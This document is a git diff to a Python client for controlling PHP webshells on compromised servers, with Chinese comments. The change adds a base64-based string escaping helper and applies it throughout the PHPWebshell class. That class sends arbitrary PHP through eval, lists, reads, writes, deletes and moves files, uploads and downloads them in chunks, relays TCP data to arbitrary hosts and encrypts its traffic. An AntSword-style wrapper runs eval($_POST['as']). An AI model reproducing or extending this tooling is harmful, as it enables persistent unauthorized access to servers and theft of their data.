@@ -580,6 +580,13 @@ def base64_encode(s: t.Union[str, bytes]):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
 
+def string_repr(s: str) -> str:
+    """给出字符串的PHP表达式，在字符串较为复杂时使用base64编码"""
+    r = repr(s)
+    if "$" not in r and "\\" not in r:
+        return r
+    return f"base64_decode({base64_encode(s)!r})"
+
 
 def to_sessionize_payload(
     payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK
@@ -657,7 +664,6 @@ php_webshell_conn_options = [
     ),
 ]
 
-# TODO: fix string repr, php will parse `$` in quoted strings
 # TODO: make code smaller by removing newlines, spaces and tabs
 # TODO: avoid using constant string WRONG_xxx for bad output but uuid
 
@@ -699,7 +705,7 @@ class PHPWebshell(PHPSessionInterface):
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
         dir_path = dir_path.removesuffix("/") + "/"
-        php_code = LIST_DIR_PHP.replace("DIR_PATH", repr(dir_path))
+        php_code = LIST_DIR_PHP.replace("DIR_PATH", string_repr(dir_path))
         json_result = await self.submit(php_code)
         try:
             result = json.loads(json_result)
@@ -730,7 +736,7 @@ class PHPWebshell(PHPSessionInterface):
     async def get_file_contents(
         self, filepath: str, max_size: int = 1024 * 200
     ) -> bytes:
-        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
+        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", string_repr(filepath)).replace(
             "MAX_SIZE", str(max_size)
         )
         result = await self.submit(php_code)
@@ -743,8 +749,8 @@ class PHPWebshell(PHPSessionInterface):
         return base64.b64decode(result)
 
     async def put_file_contents(self, filepath: str, content: bytes) -> bool:
-        php_code = PUT_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
-            "FILE_CONTENT", repr(base64_encode(content))
+        php_code = PUT_FILE_CONTENT_PHP.replace("FILE_PATH", string_repr(filepath)).replace(
+            "FILE_CONTENT", string_repr(base64_encode(content))
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
@@ -754,7 +760,7 @@ class PHPWebshell(PHPSessionInterface):
         return result == "SUCCESS"
 
     async def delete_file(self, filepath: str) -> bool:
-        php_code = DELETE_FILE_PHP.replace("FILE_PATH", repr(filepath))
+        php_code = DELETE_FILE_PHP.replace("FILE_PATH", string_repr(filepath))
         result = await self.submit(php_code)
         if result == "WRONG_NOT_FILE":
             raise exceptions.FileError("目标不是一个文件")
@@ -763,8 +769,8 @@ class PHPWebshell(PHPSessionInterface):
         return result == "SUCCESS"
 
     async def move_file(self, filepath: str, new_filepath: str) -> None:
-        php_code = MOVE_FILE_PHP.replace("#FILEPATH#", repr(filepath)).replace(
-            "#NEW_FILEPATH#", repr(new_filepath)
+        php_code = MOVE_FILE_PHP.replace("#FILEPATH#", string_repr(filepath)).replace(
+            "#NEW_FILEPATH#", string_repr(new_filepath)
         )
         result = await self.submit(php_code)
         if result == "WRONG_NOT_EXIST":
@@ -801,8 +807,8 @@ class PHPWebshell(PHPSessionInterface):
         ]
         uploaded_chunks = await asyncio.gather(*coros)
         code = UPLOAD_FILE_MERGE_PHP.replace(
-            "FILES", repr(json.dumps(uploaded_chunks))
-        ).replace("FILENAME", repr(filepath))
+            "FILES", string_repr(json.dumps(uploaded_chunks))
+        ).replace("FILENAME", string_repr(filepath))
         result = await self.submit(code)
         if result == "WRONG_NO_PERMISSION":
             raise exceptions.FileError("没有权限写入这个文件")
@@ -817,7 +823,7 @@ class PHPWebshell(PHPSessionInterface):
     ) -> bytes:
 
         filesize_text = await self.submit(
-            DOWNLOAD_FILE_FILESIZE_PHP.replace("FILEPATH", repr(filepath))
+            DOWNLOAD_FILE_FILESIZE_PHP.replace("FILEPATH", string_repr(filepath))
         )
         if filesize_text == "WRONG_NOT_FILE":
             raise exceptions.FileError("没有这个文件")
@@ -848,7 +854,7 @@ class PHPWebshell(PHPSessionInterface):
         async def download_chunk(offset: int):
             nonlocal done_count, coros
             code = (
-                DOWNLOAD_FILE_CHUNK_PHP.replace("FILEPATH", repr(filepath))
+                DOWNLOAD_FILE_CHUNK_PHP.replace("FILEPATH", string_repr(filepath))
                 .replace("OFFSET", str(offset))
                 .replace("CHUNK_SIZE", str(chunk_size))
             )
@@ -899,9 +905,9 @@ class PHPWebshell(PHPSessionInterface):
         else:
             raise exceptions.UserError(f"找不到TCP发送方法：{repr(send_method)}")
         code = (
-            template.replace("HOST", repr(host))
+            template.replace("HOST", string_repr(host))
             .replace("PORT", str(port))
-            .replace("CONTENT_B64", repr(base64_encode(content)))
+            .replace("CONTENT_B64", string_repr(base64_encode(content)))
         )
         result = await self.submit(code)
         if result == "WRONG_NOT_SUPPORTED":
@@ -989,9 +995,9 @@ class PHPWebshell(PHPSessionInterface):
                 ) from exc
             payload_b64 = base64_encode(payload)
             code = (
-                ANTIREPLAY_VERIFY_PHP.replace("SESSION_NAME", repr(session_name))
-                .replace("KEY", repr(key))
-                .replace("PAYLOAD_B64", repr(payload_b64))
+                ANTIREPLAY_VERIFY_PHP.replace("SESSION_NAME", string_repr(session_name))
+                .replace("KEY", str(key))
+                .replace("PAYLOAD_B64", string_repr(payload_b64))
                 .strip()
                 .replace("    ", "")
             )
@@ -1024,9 +1030,9 @@ class PHPWebshell(PHPSessionInterface):
             session_name = f"rsa_key_{uuid.uuid4()}"
             key_encrypted = await submitter(
                 ENCRYPTION_SENDKEY_PHP.replace(
-                    "PUBKEY_B64", repr(base64_encode(pubkey))
+                    "PUBKEY_B64", string_repr(base64_encode(pubkey))
                 )
-                .replace("SESSION_NAME", repr(session_name))
+                .replace("SESSION_NAME", string_repr(session_name))
                 .replace("    ", "")
                 .strip()
             )
@@ -1041,8 +1047,8 @@ class PHPWebshell(PHPSessionInterface):
             payload_enc = encrypt_aes256_cbc(key, payload.encode("utf-8"))
 
             result_enc = await submitter(
-                ENCRYPTION_COMMUNICATE_PHP.replace("SESSION_NAME", repr(session_name))
-                .replace("CODE_ENC", repr(base64_encode(payload_enc)))
+                ENCRYPTION_COMMUNICATE_PHP.replace("SESSION_NAME", string_repr(session_name))
+                .replace("CODE_ENC", string_repr(base64_encode(payload_enc)))
                 .replace("    ", "")
             )
             if result_enc == "WRONG_NO_SESSION":
@@ -1135,7 +1141,7 @@ class PHPWebshell(PHPSessionInterface):
         raise NotImplementedError("这个函数应该由实际的实现override")
 
     async def php_eval(self, code: str) -> str:
-        result = await self.submit(EVAL_PHP.format(code_b64=repr(base64_encode(code))))
+        result = await self.submit(EVAL_PHP.format(code_b64=string_repr(base64_encode(code))))
         return result
 
     async def emulated_antsword(self, body: bytes) -> t.Tuple[int, str]:
@@ -1143,6 +1149,6 @@ class PHPWebshell(PHPSessionInterface):
         parse_str(base64_decode(B64), $_POST);
         eval($_POST['as']);
         """.replace(
-            "B64", repr(base64_encode(body))
+            "B64", string_repr(base64_encode(body))
         )
         return await self.submit_raw(code)
